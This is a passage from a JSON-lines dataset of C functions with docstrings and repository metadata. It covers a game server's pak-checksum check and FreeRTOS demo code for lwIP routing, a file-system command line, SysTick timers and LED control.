qfalse;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif ( bGood == qfalse ) {\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\t// check if the number of checksums was correct\n\t\t\tnChkSum1 = sv.checksumFeed;\n\t\t\tfor (i = 0; i < nClientPaks; i++) {\n\t\t\t\tnChkSum1 ^= nClientChkSum[i];\n\t\t\t}\n\t\t\tnChkSum1 ^= nClientPaks;\n\t\t\tif (nChkSum1 != nClientChkSum[nClientPaks]) {\n\t\t\t\tbGood = qfalse;\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\t// break out\n\t\t\tbreak;\n\t\t}\n\n\t\tcl->gotCP = qtrue;\n\n\t\tif (bGood) {\n\t\t\tcl->pureAuthentic = 1;\n\t\t}\n\t\telse {\n\t\t\tcl->pureAuthentic = 0;\n\t\t\tcl->lastSnapshotTime = 0;\n\t\t\tcl->state = CS_ACTIVE;\n\t\t\tSV_SendClientSnapshot( cl );\n\t\t\tSV_DropClient( cl, \"Unpure client detected. Invalid .PK3 files referenced!\" );\n\t\t}\n\t}\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n==================\nSV_ClientThink\n\nAlso called by bot code\n==================\n*/\n", "func_signal": "void SV_ClientThink (client_t *cl, usercmd_t *cmd)", "code": "{\n\tcl->lastUsercmd = *cmd;\n\n\tif ( cl->state != CS_ACTIVE ) {\n\t\treturn;\t\t// may have been kicked during the last usercmd\n\t}\n\n\tVM_Call( gvm, GAME_CLIENT_THINK, cl - svs.clients );\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/* Print an IP header by using LWIP_DEBUGF\n * @param p an IP packet, p->payload pointing to the IP header\n */\n", "func_signal": "void\nip_debug_print(struct pbuf *p)", "code": "{\n  struct ip_hdr *iphdr = p->payload;\n  u8_t *payload;\n\n  payload = (u8_t *)iphdr + IP_HLEN;\n\n  LWIP_DEBUGF(IP_DEBUG, (\"IP header:\\n\"));\n  LWIP_DEBUGF(IP_DEBUG, (\"+-------------------------------+\\n\"));\n  LWIP_DEBUGF(IP_DEBUG, (\"|%2\"S16_F\" |%2\"S16_F\" |  0x%02\"X16_F\" |     %5\"U16_F\"     | (v, hl, tos, len)\\n\",\n                    IPH_V(iphdr),\n                    IPH_HL(iphdr),\n                    IPH_TOS(iphdr),\n                    ntohs(IPH_LEN(iphdr))));\n  LWIP_DEBUGF(IP_DEBUG, (\"+-------------------------------+\\n\"));\n  LWIP_DEBUGF(IP_DEBUG, (\"|    %5\"U16_F\"      |%\"U16_F\"%\"U16_F\"%\"U16_F\"|    %4\"U16_F\"   | (id, flags, offset)\\n\",\n                    ntohs(IPH_ID(iphdr)),\n                    ntohs(IPH_OFFSET(iphdr)) >> 15 & 1,\n                    ntohs(IPH_OFFSET(iphdr)) >> 14 & 1,\n                    ntohs(IPH_OFFSET(iphdr)) >> 13 & 1,\n                    ntohs(IPH_OFFSET(iphdr)) & IP_OFFMASK));\n  LWIP_DEBUGF(IP_DEBUG, (\"+-------------------------------+\\n\"));\n  LWIP_DEBUGF(IP_DEBUG, (\"|  %3\"U16_F\"  |  %3\"U16_F\"  |    0x%04\"X16_F\"     | (ttl, proto, chksum)\\n\",\n                    IPH_TTL(iphdr),\n                    IPH_PROTO(iphdr),\n                    ntohs(IPH_CHKSUM(iphdr))));\n  LWIP_DEBUGF(IP_DEBUG, (\"+-------------------------------+\\n\"));\n  LWIP_DEBUGF(IP_DEBUG, (\"|  %3\"U16_F\"  |  %3\"U16_F\"  |  %3\"U16_F\"  |  %3\"U16_F\"  | (src)\\n\",\n                    ip4_addr1(&iphdr->src),\n                    ip4_addr2(&iphdr->src),\n                    ip4_addr3(&iphdr->src),\n                    ip4_addr4(&iphdr->src)));\n  LWIP_DEBUGF(IP_DEBUG, (\"+-------------------------------+\\n\"));\n  LWIP_DEBUGF(IP_DEBUG, (\"|  %3\"U16_F\"  |  %3\"U16_F\"  |  %3\"U16_F\"  |  %3\"U16_F\"  | (dest)\\n\",\n                    ip4_addr1(&iphdr->dest),\n                    ip4_addr2(&iphdr->dest),\n                    ip4_addr3(&iphdr->dest),\n                    ip4_addr4(&iphdr->dest)));\n  LWIP_DEBUGF(IP_DEBUG, (\"+-------------------------------+\\n\"));\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwIP_130\\src\\core\\ipv4\\ip.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static portBASE_TYPE prvPerformCopy( int8_t *pcSourceFile,\n\t\t\t\t\t\t\tint32_t lSourceFileLength,\n\t\t\t\t\t\t\tint8_t *pcDestinationFile,\n\t\t\t\t\t\t\tint8_t *pxWriteBuffer,\n\t\t\t\t\t\t\tsize_t xWriteBufferLen )", "code": "{\nint32_t lBytesRead = 0, lBytesToRead, lBytesRemaining;\nF_FILE *pxFile;\nportBASE_TYPE xReturn = pdPASS;\n\n\t/* NOTE:  Error handling has been omitted for clarity. */\n\n\twhile( lBytesRead < lSourceFileLength )\n\t{\n\t\t/* How many bytes are left? */\n\t\tlBytesRemaining = lSourceFileLength - lBytesRead;\n\n\t\t/* How many bytes should be read this time around the loop.  Can't\n\t\tread more bytes than will fit into the buffer. */\n\t\tif( lBytesRemaining > ( long ) xWriteBufferLen )\n\t\t{\n\t\t\tlBytesToRead = ( long ) xWriteBufferLen;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tlBytesToRead = lBytesRemaining;\n\t\t}\n\n\t\t/* Open the source file, seek past the data that has already been\n\t\tread from the file, read the next block of data, then close the\n\t\tfile again so the destination file can be opened. */\n\t\tpxFile = f_open( ( const char * ) pcSourceFile, \"r\" );\n\t\tif( pxFile != NULL )\n\t\t{\n\t\t\tf_seek( pxFile, lBytesRead, F_SEEK_SET );\n\t\t\tf_read( pxWriteBuffer, lBytesToRead, 1, pxFile );\n\t\t\tf_close( pxFile );\n\t\t}\n\t\telse\n\t\t{\n\t\t\txReturn = pdFAIL;\n\t\t\tbreak;\n\t\t}\n\n\t\t/* Open the destination file and write the block of data to the end of\n\t\tthe file. */\n\t\tpxFile = f_open( ( const char * ) pcDestinationFile, \"a\" );\n\t\tif( pxFile != NULL )\n\t\t{\n\t\t\tf_write( pxWriteBuffer, lBytesToRead, 1, pxFile );\n\t\t\tf_close( pxFile );\n\t\t}\n\t\telse\n\t\t{\n\t\t\txReturn = pdFAIL;\n\t\t\tbreak;\n\t\t}\n\n\t\tlBytesRead += lBytesToRead;\n\t}\n\n\treturn xReturn;\n}", "path": "FreeRTOS\\Demo\\CORTEX_A9_RZ_R7S72100_IAR_DS-5\\Source\\Full-Demo\\File-releated-CLI-commands.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static portBASE_TYPE prvCDCommand( int8_t *pcWriteBuffer, size_t xWriteBufferLen, const int8_t *pcCommandString )", "code": "{\nint8_t *pcParameter;\nportBASE_TYPE xParameterStringLength;\nunsigned char ucReturned;\nsize_t xStringLength;\n\n\t/* Obtain the parameter string. */\n\tpcParameter = ( int8_t * ) FreeRTOS_CLIGetParameter\n\t\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t\tpcCommandString,\t\t/* The command string itself. */\n\t\t\t\t\t\t\t\t\t1,\t\t\t\t\t\t/* Return the first parameter. */\n\t\t\t\t\t\t\t\t\t&xParameterStringLength\t/* Store the parameter string length. */\n\t\t\t\t\t\t\t\t);\n\n\t/* Sanity check something was returned. */\n\tconfigASSERT( pcParameter );\n\n\t/* Attempt to move to the requested directory. */\n\tucReturned = f_chdir( ( char * ) pcParameter );\n\n\tif( ucReturned == F_NO_ERROR )\n\t{\n\t\tsprintf( ( char * ) pcWriteBuffer, \"In: \" );\n\t\txStringLength = strlen( ( const char * ) pcWriteBuffer );\n\t\tf_getcwd( ( char * ) &( pcWriteBuffer[ xStringLength ] ), ( unsigned char ) ( xWriteBufferLen - xStringLength ) );\n\t}\n\telse\n\t{\n\t\tsprintf( ( char * ) pcWriteBuffer, \"Error\" );\n\t}\n\n\tstrcat( ( char * ) pcWriteBuffer, cliNEW_LINE );\n\n\treturn pdFALSE;\n}", "path": "FreeRTOS\\Demo\\CORTEX_A9_RZ_R7S72100_IAR_DS-5\\Source\\Full-Demo\\File-releated-CLI-commands.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static void prvCreateFileInfoString( int8_t *pcBuffer, F_FIND *pxFindStruct )", "code": "{\nconst char *pcWritableFile = \"writable file\", *pcReadOnlyFile = \"read only file\", *pcDirectory = \"directory\";\nconst char * pcAttrib;\n\n\t/* Point pcAttrib to a string that describes the file. */\n\tif( ( pxFindStruct->attr & F_ATTR_DIR ) != 0 )\n\t{\n\t\tpcAttrib = pcDirectory;\n\t}\n\telse if( pxFindStruct->attr & F_ATTR_READONLY )\n\t{\n\t\tpcAttrib = pcReadOnlyFile;\n\t}\n\telse\n\t{\n\t\tpcAttrib = pcWritableFile;\n\t}\n\n\t/* Create a string that includes the file name, the file size and the\n\tattributes string. */\n\tsprintf( ( char * ) pcBuffer, \"%s [%s] [size=%d]\", pxFindStruct->filename, pcAttrib, pxFindStruct->filesize );\n}", "path": "FreeRTOS\\Demo\\CORTEX_A9_RZ_R7S72100_IAR_DS-5\\Source\\Full-Demo\\File-releated-CLI-commands.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vParTestToggleLED( unsigned portBASE_TYPE uxLED )", "code": "{\n\tif( uxLED < partstMAX_LEDS )\n\t{\n\t\t/* A critical section is used as the LEDs are also accessed from an\n\t\tinterrupt. */\n\t\ttaskENTER_CRITICAL();\n\t\t{\n\t\t\tif( ( ulGPIOState & ( 1UL << uxLED ) ) != 0UL )\n\t\t\t{\n\t\t\t\tulGPIOState &= ~( 1UL << uxLED );\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tulGPIOState |= ( 1UL << uxLED );\n\t\t\t}\n\t\t\t\n\t\t\tMSS_GPIO_set_outputs( ulGPIOState );\n\t\t}\n\t\ttaskEXIT_CRITICAL();\n\t}\n}", "path": "FreeRTOS\\Demo\\CORTEX_A2F200_SoftConsole\\ParTest.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/**\n * Finds the appropriate network interface for a given IP address. It\n * searches the list of network interfaces linearly. A match is found\n * if the masked IP address of the network interface equals the masked\n * IP address given to the function.\n *\n * @param dest the destination IP address for which to find the route\n * @return the netif on which to send to reach dest\n */\n", "func_signal": "struct netif *\nip_route(struct ip_addr *dest)", "code": "{\n  struct netif *netif;\n\n  /* iterate through netifs */\n  for(netif = netif_list; netif != NULL; netif = netif->next) {\n    /* network mask matches? */\n    if (netif_is_up(netif)) {\n      if (ip_addr_netcmp(dest, &(netif->ip_addr), &(netif->netmask))) {\n        /* return netif on which to forward IP packet */\n        return netif;\n      }\n    }\n  }\n  if ((netif_default == NULL) || (!netif_is_up(netif_default))) {\n    LWIP_DEBUGF(IP_DEBUG | 2, (\"ip_route: No route to 0x%\"X32_F\"\\n\", dest->addr));\n    IP_STATS_INC(ip.rterr);\n    snmp_inc_ipoutnoroutes();\n    return NULL;\n  }\n  /* no matching netif found, use default netif */\n  return netif_default;\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwIP_130\\src\\core\\ipv4\\ip.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*******************************************************************************\n* Function Name  : SysTick_CounterCmd\n* Description    : Enables or disables the SysTick counter.\n* Input          : - SysTick_Counter: new state of the SysTick counter.\n*                    This parameter can be one of the following values:\n*                       - SysTick_Counter_Disable: Disable counter\n*                       - SysTick_Counter_Enable: Enable counter\n*                       - SysTick_Counter_Clear: Clear counter value to 0\n* Output         : None\n* Return         : None\n*******************************************************************************/\n", "func_signal": "void SysTick_CounterCmd(u32 SysTick_Counter)", "code": "{\n  /* Check the parameters */\n  assert(IS_SYSTICK_COUNTER(SysTick_Counter));\n\n  if (SysTick_Counter == SysTick_Counter_Clear)\n  {\n    SysTick->VAL = SysTick_Counter_Clear;\n  }\n  else\n  {\n    if (SysTick_Counter == SysTick_Counter_Enable)\n    {\n      SysTick->CTRL |= SysTick_Counter_Enable;\n    }\n    else\n    {\n      SysTick->CTRL &= SysTick_Counter_Disable;\n    }\n  }\n}", "path": "FreeRTOS\\Demo\\CORTEX_STM32F103_IAR\\STM32F10xFWLib\\src\\stm32f10x_systick.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*******************************************************************************\n* Function Name  : SysTick_ITConfig\n* Description    : Enables or disables the SysTick Interrupt.\n* Input          : - NewState: new state of the SysTick Interrupt.\n*                    This parameter can be: ENABLE or DISABLE.\n* Output         : None\n* Return         : None\n*******************************************************************************/\n", "func_signal": "void SysTick_ITConfig(FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert(IS_FUNCTIONAL_STATE(NewState));\n\n  if (NewState != DISABLE)\n  {\n    SysTick->CTRL |= CTRL_TICKINT_Set;\n  }\n  else\n  {\n    SysTick->CTRL &= CTRL_TICKINT_Reset;\n  }\n}", "path": "FreeRTOS\\Demo\\CORTEX_STM32F103_IAR\\STM32F10xFWLib\\src\\stm32f10x_systick.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vParTestInitialise( void )", "code": "{\nlong x;\n\n\t/* Initialise the GPIO */\n\tMSS_GPIO_init();\n\n\t/* Set up GPIO for the LEDs. */\n\tfor( x = 0; x < partstMAX_LEDS; x++ )\n\t{\n\t\tMSS_GPIO_config( ( mss_gpio_id_t ) x , MSS_GPIO_OUTPUT_MODE );\n\t}\n\n\t/* All LEDs start off. */\n\tulGPIOState = 0xffffffffUL;\n\tMSS_GPIO_set_outputs( ulGPIOState );\n}", "path": "FreeRTOS\\Demo\\CORTEX_A2F200_SoftConsole\\ParTest.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static portBASE_TYPE prvDIRCommand( int8_t *pcWriteBuffer, size_t xWriteBufferLen, const int8_t *pcCommandString )", "code": "{\nstatic F_FIND *pxFindStruct = NULL;\nunsigned char ucReturned;\nportBASE_TYPE xReturn = pdFALSE;\n\n\t/* This assumes pcWriteBuffer is long enough. */\n\t( void ) pcCommandString;\n\n\t/* Ensure the buffer leaves space for the \\r\\n. */\n\tconfigASSERT( xWriteBufferLen > ( strlen( cliNEW_LINE ) * 2 ) );\n\txWriteBufferLen -= strlen( cliNEW_LINE );\n\n\tif( pxFindStruct == NULL )\n\t{\n\t\t/* This is the first time this function has been executed since the Dir\n\t\tcommand was run.  Create the find structure. */\n\t\tpxFindStruct = ( F_FIND * ) pvPortMalloc( sizeof( F_FIND ) );\n\n\t\tif( pxFindStruct != NULL )\n\t\t{\n\t\t\tucReturned = f_findfirst( \"*.*\", pxFindStruct );\n\n\t\t\tif( ucReturned == F_NO_ERROR )\n\t\t\t{\n\t\t\t\tprvCreateFileInfoString( pcWriteBuffer, pxFindStruct );\n\t\t\t\txReturn = pdPASS;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tsnprintf( ( char * ) pcWriteBuffer, xWriteBufferLen, \"Error: f_findfirst() failed.\" );\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tsnprintf( ( char * ) pcWriteBuffer, xWriteBufferLen, \"Failed to allocate RAM (using heap_4.c will prevent fragmentation).\" );\n\t\t}\n\t}\n\telse\n\t{\n\t\t/* The find struct has already been created.  Find the next file in\n\t\tthe directory. */\n\t\tucReturned = f_findnext( pxFindStruct );\n\n\t\tif( ucReturned == F_NO_ERROR )\n\t\t{\n\t\t\tprvCreateFileInfoString( pcWriteBuffer, pxFindStruct );\n\t\t\txReturn = pdPASS;\n\t\t}\n\t\telse\n\t\t{\n\t\t\t/* There are no more files.  Free the find structure. */\n\t\t\tvPortFree( pxFindStruct );\n\t\t\tpxFindStruct = NULL;\n\n\t\t\t/* No string to return. */\n\t\t\tpcWriteBuffer[ 0 ] = 0x00;\n\t\t}\n\t}\n\n\tstrcat( ( char * ) pcWriteBuffer, cliNEW_LINE );\n\n\treturn xReturn;\n}", "path": "FreeRTOS\\Demo\\CORTEX_A9_RZ_R7S72100_IAR_DS-5\\Source\\Full-Demo\\File-releated-CLI-commands.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*******************************************************************************\n* Function Name  : SysTick_GetFlagStatus\n* Description    : Checks whether the specified SysTick flag is set or not.\n* Input          : - SysTick_FLAG: specifies the flag to check.\n*                    This parameter can be one of the following values:\n*                       - SysTick_FLAG_COUNT\n*                       - SysTick_FLAG_SKEW\n*                       - SysTick_FLAG_NOREF\n* Output         : None\n* Return         : None\n*******************************************************************************/\n", "func_signal": "FlagStatus SysTick_GetFlagStatus(u8 SysTick_FLAG)", "code": "{\n  u32 tmp = 0;\n  u32 statusreg = 0;\n  FlagStatus bitstatus = RESET;\n\n  /* Check the parameters */\n  assert(IS_SYSTICK_FLAG(SysTick_FLAG));\n\n  /* Get the SysTick register index */\n  tmp = SysTick_FLAG >> 5;\n\n  if (tmp == 1) /* The flag to check is in CTRL register */\n  {\n    statusreg = SysTick->CTRL;\n  }\n  else          /* The flag to check is in CALIB register */\n  {\n    statusreg = SysTick->CALIB;\n  }\n\n  /* Get the flag position */\n  tmp = SysTick_FLAG & FLAG_Mask;\n\n  if ((statusreg & ((u32)1 << tmp)) != (u32)RESET)\n  {\n    bitstatus = SET;\n  }\n  else\n  {\n    bitstatus = RESET;\n  }\n  return bitstatus;\n}", "path": "FreeRTOS\\Demo\\CORTEX_STM32F103_IAR\\STM32F10xFWLib\\src\\stm32f10x_systick.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*******************************************************************************\n* Function Name  : SysTick_SetReload\n* Description    : Sets SysTick Reload value.\n* Input          : - Reload: SysTick Reload new value.\n*                    This parameter must be a number between 1 and 0xFFFFFF.\n* Output         : None\n* Return         : None\n*******************************************************************************/\n", "func_signal": "void SysTick_SetReload(u32 Reload)", "code": "{\n  /* Check the parameters */\n  assert(IS_SYSTICK_RELOAD(Reload));\n\n  SysTick->LOAD = Reload;\n}", "path": "FreeRTOS\\Demo\\CORTEX_STM32F103_IAR\\STM32F10xFWLib\\src\\stm32f10x_systick.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static portBASE_TYPE prvDELCommand( int8_t *pcWriteBuffer, size_t xWriteBufferLen, const int8_t *pcCommandString )", "code": "{\nint8_t *pcParameter;\nportBASE_TYPE xParameterStringLength;\nunsigned char ucReturned;\n\n\t/* This function assumes xWriteBufferLen is large enough! */\n\t( void ) xWriteBufferLen;\n\n\t/* Obtain the parameter string. */\n\tpcParameter = ( int8_t * ) FreeRTOS_CLIGetParameter\n\t\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t\tpcCommandString,\t\t/* The command string itself. */\n\t\t\t\t\t\t\t\t\t1,\t\t\t\t\t\t/* Return the first parameter. */\n\t\t\t\t\t\t\t\t\t&xParameterStringLength\t/* Store the parameter string length. */\n\t\t\t\t\t\t\t\t);\n\n\t/* Sanity check something was returned. */\n\tconfigASSERT( pcParameter );\n\n\t/* Attempt to delete the file. */\n\tucReturned = f_delete( ( const char * ) pcParameter );\n\n\tif( ucReturned == F_NO_ERROR )\n\t{\n\t\tsprintf( ( char * ) pcWriteBuffer, \"%s was deleted\", pcParameter );\n\t}\n\telse\n\t{\n\t\tsprintf( ( char * ) pcWriteBuffer, \"Error\" );\n\t}\n\n\tstrcat( ( char * ) pcWriteBuffer, cliNEW_LINE );\n\n\treturn pdFALSE;\n}", "path": "FreeRTOS\\Demo\\CORTEX_A9_RZ_R7S72100_IAR_DS-5\\Source\\Full-Demo\\File-releated-CLI-commands.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static portBASE_TYPE prvTYPECommand( int8_t *pcWriteBuffer, size_t xWriteBufferLen, const int8_t *pcCommandString )", "code": "{\nint8_t *pcParameter;\nportBASE_TYPE xParameterStringLength, xReturn = pdTRUE;\nstatic F_FILE *pxFile = NULL;\nint iChar;\nsize_t xByte;\nsize_t xColumns = 50U;\n\n\t/* Ensure there is always a null terminator after each character written. */\n\tmemset( pcWriteBuffer, 0x00, xWriteBufferLen );\n\n\t/* Ensure the buffer leaves space for the \\r\\n. */\n\tconfigASSERT( xWriteBufferLen > ( strlen( cliNEW_LINE ) * 2 ) );\n\txWriteBufferLen -= strlen( cliNEW_LINE );\n\n\tif( xWriteBufferLen < xColumns )\n\t{\n\t\t/* Ensure the loop that uses xColumns as an end condition does not\n\t\twrite off the end of the buffer. */\n\t\txColumns = xWriteBufferLen;\n\t}\n\n\tif( pxFile == NULL )\n\t{\n\t\t/* The file has not been opened yet.  Find the file name. */\n\t\tpcParameter = ( int8_t * ) FreeRTOS_CLIGetParameter\n\t\t\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t\t\tpcCommandString,\t\t/* The command string itself. */\n\t\t\t\t\t\t\t\t\t\t1,\t\t\t\t\t\t/* Return the first parameter. */\n\t\t\t\t\t\t\t\t\t\t&xParameterStringLength\t/* Store the parameter string length. */\n\t\t\t\t\t\t\t\t\t);\n\n\t\t/* Sanity check something was returned. */\n\t\tconfigASSERT( pcParameter );\n\n\t\t/* Attempt to open the requested file. */\n\t\tpxFile = f_open( ( const char * ) pcParameter, \"r\" );\n\t}\n\n\tif( pxFile != NULL )\n\t{\n\t\t/* Read the next chunk of data from the file. */\n\t\tfor( xByte = 0; xByte < xColumns; xByte++ )\n\t\t{\n\t\t\tiChar = f_getc( pxFile );\n\n\t\t\tif( iChar == -1 )\n\t\t\t{\n\t\t\t\t/* No more characters to return. */\n\t\t\t\tf_close( pxFile );\n\t\t\t\tpxFile = NULL;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tpcWriteBuffer[ xByte ] = ( int8_t ) iChar;\n\t\t\t}\n\t\t}\n\t}\n\n\tif( pxFile == NULL )\n\t{\n\t\t/* Either the file was not opened, or all the data from the file has\n\t\tbeen returned and the file is now closed. */\n\t\txReturn = pdFALSE;\n\t}\n\n\tstrcat( ( char * ) pcWriteBuffer, cliNEW_LINE );\n\n\treturn xReturn;\n}", "path": "FreeRTOS\\Demo\\CORTEX_A9_RZ_R7S72100_IAR_DS-5\\Source\\Full-Demo\\File-releated-CLI-commands.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static portBASE_TYPE prvCOPYCommand( int8_t *pcWriteBuffer, size_t xWriteBufferLen, const int8_t *pcCommandString )", "code": "{\nint8_t *pcSourceFile, *pcDestinationFile;\nportBASE_TYPE xParameterStringLength;\nlong lSourceLength, lDestinationLength = 0;\n\n\t/* Obtain the name of the destination file. */\n\tpcDestinationFile = ( int8_t * ) FreeRTOS_CLIGetParameter\n\t\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t\tpcCommandString,\t\t/* The command string itself. */\n\t\t\t\t\t\t\t\t\t2,\t\t\t\t\t\t/* Return the second parameter. */\n\t\t\t\t\t\t\t\t\t&xParameterStringLength\t/* Store the parameter string length. */\n\t\t\t\t\t\t\t\t);\n\n\t/* Sanity check something was returned. */\n\tconfigASSERT( pcDestinationFile );\n\n\t/* Obtain the name of the source file. */\n\tpcSourceFile = ( int8_t * ) FreeRTOS_CLIGetParameter\n\t\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t\tpcCommandString,\t\t/* The command string itself. */\n\t\t\t\t\t\t\t\t\t1,\t\t\t\t\t\t/* Return the first parameter. */\n\t\t\t\t\t\t\t\t\t&xParameterStringLength\t/* Store the parameter string length. */\n\t\t\t\t\t\t\t\t);\n\n\t/* Sanity check something was returned. */\n\tconfigASSERT( pcSourceFile );\n\n\t/* Terminate the string. */\n\tpcSourceFile[ xParameterStringLength ] = 0x00;\n\n\t/* See if the source file exists, obtain its length if it does. */\n\tlSourceLength = f_filelength( ( const char * ) pcSourceFile );\n\n\tif( lSourceLength == 0 )\n\t{\n\t\tsprintf( ( char * ) pcWriteBuffer, \"Source file does not exist\" );\n\t}\n\telse\n\t{\n\t\t/* See if the destination file exists. */\n\t\tlDestinationLength = f_filelength( ( const char * ) pcDestinationFile );\n\n\t\tif( lDestinationLength != 0 )\n\t\t{\n\t\t\tsprintf( ( char * ) pcWriteBuffer, \"Error: Destination file already exists\" );\n\t\t}\n\t}\n\n\t/* Continue only if the source file exists and the destination file does\n\tnot exist. */\n\tif( ( lSourceLength != 0 ) && ( lDestinationLength == 0 ) )\n\t{\n\t\tif( prvPerformCopy( pcSourceFile, lSourceLength, pcDestinationFile, pcWriteBuffer, xWriteBufferLen ) == pdPASS )\n\t\t{\n\t\t\tsprintf( ( char * ) pcWriteBuffer, \"Copy made\" );\n\t\t}\n\t\telse\n\t\t{\n\t\t\tsprintf( ( char * ) pcWriteBuffer, \"Error during copy\" );\n\t\t}\n\t}\n\n\tstrcat( ( char * ) pcWriteBuffer, cliNEW_LINE );\n\n\treturn pdFALSE;\n}", "path": "FreeRTOS\\Demo\\CORTEX_A9_RZ_R7S72100_IAR_DS-5\\Source\\Full-Demo\\File-releated-CLI-commands.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vParTestSetLED( unsigned portBASE_TYPE uxLED, signed portBASE_TYPE xValue )", "code": "{\n\tif( uxLED < partstMAX_LEDS )\n\t{\n\t\t/* A critical section is used as the LEDs are also accessed from an\n\t\tinterrupt. */\n\t\ttaskENTER_CRITICAL();\n\t\t{\n\t\t\tif( xValue == pdTRUE )\n\t\t\t{\n\t\t\t\tulGPIOState &= ~( 1UL << uxLED );\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tulGPIOState |= ( 1UL << uxLED );\n\t\t\t}\n\t\t\t\n\t\t\tMSS_GPIO_set_outputs( ulGPIOState );\n\t\t}\n\t\ttaskEXIT_CRITICAL();\n\t}\n}", "path": "FreeRTOS\\Demo\\CORTEX_A2F200_SoftConsole\\ParTest.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/**\n * Simple interface to ip_output_if. It finds the outgoing network\n * interface and calls upon ip_output_if to do the actual work.\n *\n * @param p the packet to send (p->payload points to the data, e.g. next\n            protocol header; if dest == IP_HDRINCL, p already includes an IP\n            header and p->payload points to that IP header)\n * @param src the source IP address to send from (if src == IP_ADDR_ANY, the\n *         IP  address of the netif used to send is used as source address)\n * @param dest the destination IP address to send the packet to\n * @param ttl the TTL value to be set in the IP header\n * @param tos the TOS value to be set in the IP header\n * @param proto the PROTOCOL to be set in the IP header\n *\n * @return ERR_RTE if no route is found\n *         see ip_output_if() for more return values\n */\n", "func_signal": "err_t\nip_output(struct pbuf *p, struct ip_addr *src, struct ip_addr *dest,\n          u8_t ttl, u8_t tos, u8_t proto)", "code": "{\n  struct netif *netif;\n\n  if ((netif = ip_route(dest)) == NULL) {\n    return ERR_RTE;\n  }\n\n  return ip_output_if(p, src, dest, ttl, tos, proto, netif);\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwIP_130\\src\\core\\ipv4\\ip.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "long lParTestGetLEDState( unsigned long ulLED )", "code": "{\nlong lReturn = pdFALSE;\n\n\tif( ulLED < partstMAX_LEDS )\n\t{\n\t\ttaskENTER_CRITICAL();\n\t\t{\n\t\t\tif( ( ulGPIOState & ( 1UL << ulLED ) ) == 0UL )\n\t\t\t{\n\t\t\t\tlReturn = pdTRUE;\n\t\t\t}\n\t\t}\n\t\ttaskEXIT_CRITICAL();\n\t}\n\n\treturn lReturn;\n}", "path": "FreeRTOS\\Demo\\CORTEX_A2F200_SoftConsole\\ParTest.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
